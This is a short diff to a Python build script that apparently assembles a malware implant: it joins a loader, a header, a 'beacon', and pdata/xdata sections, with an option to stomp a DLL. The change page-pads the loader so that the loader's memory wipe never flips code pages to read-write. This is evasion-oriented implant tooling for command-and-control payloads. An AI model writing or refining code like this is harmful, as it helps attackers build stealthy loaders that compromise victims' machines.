@@ -194,7 +194,11 @@ def main():
             xdata = bytes(entry_ui) + xdata
 
         hdr = build_header(len(beacon), len(pdata), len(xdata), text_rva, flags, args.stomp_dll)
-        payload = loader + hdr + beacon + pdata + xdata
+        # Page-pad the loader so the header starts at the next page boundary:
+        # the loader's staged-copy wipe flips only the tail to RW, which must
+        # never include a page holding loader code.
+        pad = -len(loader) & 0xFFF
+        payload = loader + b"\x00" * pad + hdr + beacon + pdata + xdata
 
     with open(args.output, "wb") as f:
         f.write(payload)
